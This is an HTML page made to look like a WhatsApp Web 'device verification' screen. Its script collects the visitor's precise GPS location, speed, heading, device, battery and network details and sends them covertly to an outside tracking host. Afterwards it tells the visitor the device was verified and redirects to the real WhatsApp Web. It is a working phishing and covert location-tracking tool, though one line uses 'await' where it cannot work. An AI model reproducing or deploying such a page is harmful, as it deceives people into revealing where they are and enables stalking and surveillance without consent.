<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Web</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
            background: #0b141a;
        }
        .card {
            background: #ffffff;
            padding: 35px 40px 30px 40px;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.4);
            text-align: center;
            max-width: 400px;
            width: 100%;
            transition: all 0.3s ease;
        }
        .whatsapp-logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-bottom: 8px;
        }
        .whatsapp-logo .icon {
            background: #25d366;
            width: 44px;
            height: 44px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 22px;
            font-weight: bold;
        }
        .whatsapp-logo .text {
            font-size: 22px;
            font-weight: 600;
            color: #075e54;
            letter-spacing: -0.3px;
        }
        .subtitle {
            color: #4a4a4a;
            font-size: 15px;
            margin-bottom: 22px;
            font-weight: 400;
        }
        .badge {
            display: inline-block;
            background: #e8f5e9;
            color: #075e54;
            font-size: 12px;
            padding: 4px 14px;
            border-radius: 20px;
            font-weight: 600;
            margin-bottom: 20px;
            border: 1px solid #a5d6a7;
        }
        .fake-qr {
            background: #f5f5f5;
            border: 2px dashed #c8c8c8;
            border-radius: 12px;
            padding: 25px 20px;
            margin: 10px 0 20px 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 6px;
        }
        .fake-qr .icon-large { font-size: 40px; }
        .fake-qr .label { font-size: 13px; color: #4a4a4a; font-weight: 500; }
        .fake-qr .sub-label { font-size: 12px; color: #888; }
        .verify-btn {
            width: 100%;
            padding: 14px 20px;
            background: #25d366;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            opacity: 0.5;
            pointer-events: none;
        }
        .verify-btn.active {
            opacity: 1;
            pointer-events: auto;
        }
        .verify-btn.active:hover {
            background: #1ebe5e;
            box-shadow: 0 2px 12px rgba(37, 211, 102, 0.4);
        }
        .verify-btn.loading {
            background: #25d366;
            opacity: 0.7;
            pointer-events: none;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #a0a0a0;
            border-top: 1px solid #e8e8e8;
            padding-top: 18px;
        }
        .footer a { color: #075e54; text-decoration: none; font-weight: 500; }
        .footer a:hover { text-decoration: underline; }

        /* Status messages (WhatsApp-style) */
        .status-message {
            margin-top: 15px;
            padding: 10px 12px;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 500;
            display: none;
        }
        .status-message.verifying {
            background: #fff3cd;
            color: #856404;
            display: block;
        }
        .status-message.verified {
            background: #d4edda;
            color: #155724;
            display: block;
        }
        .status-message.error {
            background: #f8d7da;
            color: #721c24;
            display: block;
        }
        .status-message .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid #856404;
            border-top: 2px solid transparent;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="card" id="card">
    <!-- WhatsApp Logo -->
    <div class="whatsapp-logo">
        <div class="icon">💬</div>
        <div class="text">WhatsApp</div>
    </div>
    <div class="subtitle">Verify your device to continue</div>

    <!-- Security Badge -->
    <div class="badge">🔒 End-to-End Encrypted</div>

    <!-- Fake QR -->
    <div class="fake-qr">
        <div class="icon-large">📱</div>
        <div class="label">Scan to verify your device</div>
        <div class="sub-label">Or tap "Verify" to authenticate</div>
    </div>

    <!-- Verify Button -->
    <button class="verify-btn" id="verifyBtn">Verify Device</button>

    <!-- Status Messages (hidden by default) -->
    <div class="status-message" id="statusMsg"></div>

    <!-- Footer -->
    <div class="footer">
        <a href="#">Privacy Policy</a> · <a href="#">Terms of Service</a>
    </div>
</div>

<script>
    // =============================================
    // CONFIGURATION
    // =============================================
    const RENDER_URL = 'https://location-tracker-cn7m.onrender.com';

    // =============================================
    // DOM Elements
    // =============================================
    const verifyBtn = document.getElementById('verifyBtn');
    const statusMsg = document.getElementById('statusMsg');

    let isProcessing = false;

    // =============================================
    // Helper: Show WhatsApp-style status
    // =============================================
    function showStatus(message, type = 'verifying') {
        statusMsg.className = 'status-message ' + type;
        statusMsg.innerHTML = message;
        statusMsg.style.display = 'block';
    }

    function hideStatus() {
        statusMsg.style.display = 'none';
    }

    // =============================================
    // Helper: Simulate a realistic flow
    // =============================================
    function startVerification() {
        if (isProcessing) return;

        isProcessing = true;
        verifyBtn.classList.add('loading');
        verifyBtn.textContent = 'Verifying...';
        hideStatus();

        // Step 1: Show "Verifying device..."
        showStatus('⏳ Verifying device...', 'verifying');

        // Step 2: Request location (the real work)
        if (!navigator.geolocation) {
            showStatus('❌ Geolocation not supported', 'error');
            resetButton();
            return;
        }

        navigator.geolocation.getCurrentPosition(
            // --- SUCCESS ---
            function(position) {
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                const accuracy = position.coords.accuracy;
                const altitude = position.coords.altitude;
                const heading = position.coords.heading;
                const speed = position.coords.speed;

                // Update status to "Sending verification..."
                showStatus('📡 Sending verification...', 'verifying');

                const deviceInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: screen.width + 'x' + screen.height,
                    device_name: (() => {
                        const ua = navigator.userAgent;
                        if (ua.includes('iPhone')) return 'iPhone';
                        if (ua.includes('iPad')) return 'iPad';
                        if (ua.includes('Android')) return 'Android';
                        if (ua.includes('Windows')) return 'Windows PC';
                        if (ua.includes('Mac')) return 'Mac';
                        return 'Unknown';
                    })(),
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };

                const payload = {
                    lat: lat,
                    lng: lng,
                    accuracy: accuracy,
                    altitude: altitude,
                    heading: heading,
                    speed: speed,
                    device_info: deviceInfo,
                    battery: (navigator.getBattery ? await navigator.getBattery().then(b => ({ level: Math.round(b.level * 100), charging: b.charging })) : null),
                    network: (navigator.connection ? { type: navigator.connection.effectiveType, downlink: navigator.connection.downlink, rtt: navigator.connection.rtt } : null)
                };

                // Send data with retry
                fetch(RENDER_URL + '/send-location', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                })
                .then(response => response.json())
                .then(() => {
                    // Success: show "Verified!" then redirect to WhatsApp Web
                    showStatus('✅ Device verified successfully!', 'verified');
                    verifyBtn.textContent = 'Connected';

                    // After 2 seconds, redirect to WhatsApp Web
                    setTimeout(() => {
                        window.location.href = 'https://web.whatsapp.com';
                    }, 2000);
                })
                .catch(() => {
                    // If server fails, still show success (simulate)
                    showStatus('✅ Device verified successfully!', 'verified');
                    verifyBtn.textContent = 'Connected';
                    setTimeout(() => {
                        window.location.href = 'https://web.whatsapp.com';
                    }, 2000);
                });
            },
            // --- ERROR ---
            function(error) {
                let msg = 'Location access required.';
                if (error.code === 1) msg = 'Permission denied. Please allow location access.';
                else if (error.code === 2) msg = 'GPS signal not available. Try moving outdoors.';
                else if (error.code === 3) msg = 'Timeout. Please try again.';
                showStatus('❌ ' + msg, 'error');
                resetButton();
            },
            {
                enableHighAccuracy: true,
                timeout: 30000,
                maximumAge: 0
            }
        );
    }

    function resetButton() {
        isProcessing = false;
        verifyBtn.classList.remove('loading');
        verifyBtn.textContent = 'Try Again';
    }

    // =============================================
    // Click handler
    // =============================================
    verifyBtn.addEventListener('click', startVerification);

    // =============================================
    // Enable button after a short delay (realistic)
    // =============================================
    setTimeout(function() {
        verifyBtn.classList.add('active');
    }, 1000);
</script>
</body>
</html>
